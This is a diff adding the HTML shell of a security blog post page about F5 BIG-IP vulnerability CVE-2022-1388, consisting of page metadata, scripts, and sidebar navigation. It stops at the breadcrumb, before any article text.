@@ -1,0 +1,1901 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="no-js dark">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#76B900" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#1a1a1a" media="(prefers-color-scheme: dark)">
+
+
+<link rel="icon" href="/favicon.ico" sizes="32x32">
+<link rel="icon" href="/icon.svg" type="image/svg+xml">  
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="manifest" href="/manifest.webmanifest">
+
+
+<title>F5 BIG-IP iControl REST vulnerability CVE-2022-1388 | .burso | blog about ctf &amp; anything else</title>
+<meta name="title" content="F5 BIG-IP iControl REST vulnerability CVE-2022-1388" /><meta name="description" content="Good afternoon to every security researcher. I would like to share my experience of finding announced vulnerability by internal F5 security team and writing the …" />
+
+<script src="/js/early/early-init.js" defer></script>
+
+
+<style>
+   
+  html.no-transitions,
+  html.no-transitions * {
+    transition: none !important;
+  }
+  
+   
+  :root {
+    --color-text-primary: #111827;
+    --color-text-secondary: #6b7280;
+    --color-bg-primary: #ffffff;
+    --color-bg-secondary: #f9fafb;
+    --color-surface: #ffffff;
+  }
+  
+  .dark {
+    --color-text-primary: #f9fafb;
+    --color-text-secondary: #d1d5db;
+    --color-bg-primary: #111827;
+    --color-bg-secondary: #1f2937;
+    --color-surface: #1f2937;
+  }
+  
+   
+  body {
+    background-color: var(--color-bg-primary);
+    color: var(--color-text-primary);
+    transition: background-color 0.2s ease, color 0.2s ease;
+  }
+  
+  html.no-transitions body {
+    transition: none !important;
+  }
+</style>
+
+<meta name="keywords" content="F5, CVE-2022-1388, BIG-IP, REST, API, posts" />
+<meta name="author" content="Matus Bursa" /><meta name="article:published_time" content="2022-05-09T16:42:00&#43;01:00" /><meta name="article:modified_time" content="2025-10-13T12:20:35&#43;02:00" /><meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large" />
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="F5 BIG-IP iControl REST vulnerability CVE-2022-1388" />
+<meta property="og:description" content="Good afternoon to every security researcher. I would like to share my experience of finding announced vulnerability by internal F5 security team and writing the …" />
+<meta property="og:url" content="//localhost:1313/posts/big-ip-f5/" />
+<meta property="og:site_name" content=".burso | blog about ctf &amp; anything else" />
+<meta property="og:locale" content="en" />
+<meta property="article:published_time" content="2022-05-09T16:42:00&#43;01:00" /><meta property="article:modified_time" content="2025-10-13T12:20:35&#43;02:00" /><meta property="article:author" content="Matus Bursa" /><meta property="article:section" content="posts" /><meta property="article:tag" content="F5" /><meta property="article:tag" content="CVE-2022-1388" /><meta property="article:tag" content="BIG-IP" /><meta property="article:tag" content="REST" /><meta property="article:tag" content="API" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="F5 BIG-IP iControl REST vulnerability CVE-2022-1388" />
+<meta name="twitter:description" content="Good afternoon to every security researcher. I would like to share my experience of finding announced vulnerability by internal F5 security team and writing the …" />
+
+
+
+
+<link rel="canonical" href="//localhost:1313/posts/big-ip-f5/" />
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "\u0022F5 BIG-IP iControl REST vulnerability CVE-2022-1388\u0022",
+  "description": "\"Good afternoon to every security researcher. I would like to share my experience of finding announced vulnerability by internal F5 security team and writing the …\"",
+  "url": "\/\/localhost:1313\/posts\/big-ip-f5\/","datePublished": "2022-05-09T16:42:00\u002b01:00","dateModified": "2025-10-13T12:20:35\u002b02:00","author": {
+        "@type": "Person",
+        "name": "Matus Bursa"
+      },"wordCount":  878 ,"publisher": {
+    "@type": "Organization",
+    "name": ".burso | blog about ctf \u0026 anything else",
+    "url": "\/\/localhost:1313\/"}
+}
+</script>
+
+
+<meta name="generator" content="Hugo 0.151.0">
+
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+<link rel="dns-prefetch" href="//unpkg.com">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <link rel="stylesheet" href="/css/bundle-development.css" id="main-css">
+  <style>
+    :root {
+      --hugo-environment: "development";
+      --hugo-build: "development";
+      --theme-version: "0.0.0";
+    }</style>
+<script type="module" src="/js/bundle-development.js" defer></script>
+  
+  <script type="application/json" id="hugo-environment-json">
+    {
+      "environment": "development",
+      "isProduction":  false ,
+      "debug":  false ,
+      "version": "0.0.0",
+      "baseURL": "\/\/localhost:1313\/",
+      "buildTime": "1760543465647"
+    }
+  </script><script src="/js/hugo-env-init.js" defer></script>
+
+  
+</head>
+<body class="bg-bg-primary antialiased" 
+      data-environment="development" 
+      data-theme="dark"
+      data-build="development"
+      data-version="0.0.0">
+  <header>
+</header><nav id="topNav" class="topbar" data-component="navigation-topbar">
+    
+    <div class="topbar__logo"><a href="/" class="topbar__logo-link"><img id="lightModeHome" src="/icons/light/home.svg" alt="Home" class="topbar__logo-image hidden">
+<img id="darkModeHome" src="/icons/dark/home.svg" alt="Home" class="topbar__logo-image hidden"></a>
+</div>
+    
+    
+    <div class="topbar__navigation">
+</div>
+    
+    
+    <div class="topbar__search"></div>
+    
+    
+    <div class="topbar__controls"><div id="chatTocToggle" class="chat-toc-toggle" role="group" aria-label="Switch between Chat and Table of Contents" data-component="chat-toc-toggle">
+            <button class="chat-toc-toggle__option" data-mode="chat" aria-label="Switch to Chat" title="Chat Panel">
+                <img src="/icons/light/robot.svg" alt="Chat" class="icon chat-toc-toggle__icon">
+            </button>
+            <button class="chat-toc-toggle__option" data-mode="toc" aria-label="Switch to Table of Contents" title="Table of Contents">
+                <img src="/icons/light/toc.svg" alt="TOC" class="icon chat-toc-toggle__icon">
+            </button>
+        </div>
+        
+        
+        
+        <button id="darkModeToggle" aria-label="Toggle Darkmode" class="topbar__button" data-component="theme-toggle">
+            <img id="moon" src="/icons/light/dark.svg" alt="moon" class="icon hidden" title="Dark Mode">
+            <img id="sun" src="/icons/light/light.svg" alt="sun" class="icon hidden" title="Light Mode">
+        </button>
+    </div>
+</nav>
+  <main class="layout-shell layout-density--comfortable" data-has-right-rail="true" >
+    
+
+<button type="button" class="fixed top-4 left-4 z-50 xl:hidden bg-brand text-white p-2 rounded-lg shadow-lg" aria-label="Toggle navigation menu" data-component="navigation-mobile-toggle">
+    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+    </svg>
+</button>
+
+
+<div class="fixed inset-0 bg-black bg-opacity-50 z-40 hidden xl:hidden" data-navigation-overlay></div>
+
+
+
+<aside id="sidebar-left" class="sidebar block fixed xl:sticky left-0 top-0 xl:top-16 z-40 h-full xl:h-[calc(100vh-4rem)] w-80 xl:w-auto -translate-x-full xl:translate-x-0 transition-all duration-300 ease-in-out overflow-y-auto pr-1" data-component="navigation-sidebar-left" role="navigation" aria-label="Primary">
+    
+    <div class="sidebar__header flex xl:hidden items-center justify-between p-4">
+        <h2 class="text-lg font-semibold">Navigation</h2>
+        <button type="button" class="sidebar__close-button p-2 rounded-lg" aria-label="Close navigation menu" data-navigation-close>
+            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+            </svg>
+        </button>
+    </div>
+    
+    <div class="sidebar__link-tree pt-4 md:pt-4 px-4 md:px-0 h-full w-full" data-link-tree>
+        
+        
+        <ul class="space-y-1 pl-0 list-none" data-level="1">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-1
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/" 
+        data-level="1" 
+        data-current="false" 
+        data-parent="/" 
+        data-section="true">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Posts
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Posts section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="2">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link sidebar__link--active" 
+        href="/posts/big-ip-f5/" 
+        data-level="2" 
+        data-current="true" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    F5 BIG-IP iControl REST vulnerability CVE-2022-1388
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/racecar/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    racecar
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/ret2win/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    ret2win
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/brainpan-1/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    brainpan 1
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/reversing-elf/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Reversing ELF
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/inclusion/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Inclusion
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/blue/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Blue
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/borderlands/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Borderlands
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/bookface/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Bookface
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/daily-bugle/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Daily Bugle
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/impossible-password/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Impossible Password
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/citrix-vulnerability/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    How find a vulnerable server on the internet?
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/grsec-patch-size-overflow/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    .grsec patch size_overflow
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-1
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/" 
+        data-level="1" 
+        data-current="false" 
+        data-parent="/" 
+        data-section="true">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Index.md
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Index.md section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="2">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/docs/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Academy
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Academy section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="3">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-3
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/conferences/" 
+        data-level="3" 
+        data-current="false" 
+        data-parent="/docs/academy/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Conferences
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Conferences section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="4">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-4
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/conferences/2017/" 
+        data-level="4" 
+        data-current="false" 
+        data-parent="/docs/academy/conferences/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    2017
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand 2017 section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="5">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-default">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/conferences/2017/34c3-tuwat/" 
+        data-level="5" 
+        data-current="false" 
+        data-parent="/docs/academy/conferences/2017/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Notes from #34c3
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-4
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/conferences/2024/" 
+        data-level="4" 
+        data-current="false" 
+        data-parent="/docs/academy/conferences/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    2024
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand 2024 section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-4
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/conferences/2025/" 
+        data-level="4" 
+        data-current="false" 
+        data-parent="/docs/academy/conferences/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    2025
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand 2025 section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-3
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/htb/" 
+        data-level="3" 
+        data-current="false" 
+        data-parent="/docs/academy/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Hack The Box
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Hack The Box section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-3
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/pnpt/" 
+        data-level="3" 
+        data-current="false" 
+        data-parent="/docs/academy/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Practical Network Penetration Tester
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Practical Network Penetration Tester section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-3
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/osce/" 
+        data-level="3" 
+        data-current="false" 
+        data-parent="/docs/academy/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Offensive Security Certified Expert
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Offensive Security Certified Expert section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="4">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-4
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/osce/osce-prologue/" 
+        data-level="4" 
+        data-current="false" 
+        data-parent="/docs/academy/osce/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Prologue
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/f1/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/docs/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    F1
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand F1 section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="3">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-3
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/f1/how-to-fix-f1/" 
+        data-level="3" 
+        data-current="false" 
+        data-parent="/docs/f1/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    How to fix Formula1 or how to make F1 even more exciting sport.
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/prielom/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/docs/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Prielom
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Prielom section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="3">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-3
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/prielom/prielom-1/" 
+        data-level="3" 
+        data-current="false" 
+        data-parent="/docs/prielom/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    .prielom #1
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+</ul>
+    </div>
+</aside>
+    <div id="pageContainer" class="p-4 w-full md:flex-1 min-w-0 mx-auto page-container xl:px-8 2xl:px-12">
+      
+      
+      
+      
+      <div id="mainContent" class="transition-opacity duration-300"><section id="articleSummarizationContainer" class="hidden border border-dotted m-4 p-4 rounded-md transition-opacity duration-500" data-component="article-summarization">
+    <h2 class="text-3xl font-bold text-text-primary mb-4">Article Summarization</h2>
+    <div id="articleSummaryOutput" class="flex items-center justify-center p-4 my-4 bg-zinc-100 rounded-md text-text-primary text-sm transition-all duration-300 ease-in-out">
+        <div class="animate-spin h-5 w-5 mr-3 border-4 border-brand rounded-full border-t-transparent"></div>
+        <p id="generationMessage">Generating summary...</p>
+    </div>
+</section>
+<div class="mb-4 mx-auto max-w-3xl xl:max-w-4xl 2xl:max-w-5xl">
+      <div class="article-header" data-component="article-header">
+  <div class="article-header__navigation">
+    <nav aria-label="Breadcrumb" class="breadcrumb" role="navigation" data-component="breadcrumbs">
+  <ol class="breadcrumb__list" itemscope itemtype="https://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem" class="breadcrumb__item">
+        <a href="//localhost:1313/posts/" 
+           class="breadcrumb__link" 
+           itemprop="item"
+           aria-label="Navigate to Posts">
+          <span itemprop="name">Posts</span>
+        </a>
+        <meta itemprop="position" content="1" />
+        <span class="breadcrumb__separator" aria-hidden="true">›</span>
+      </li>
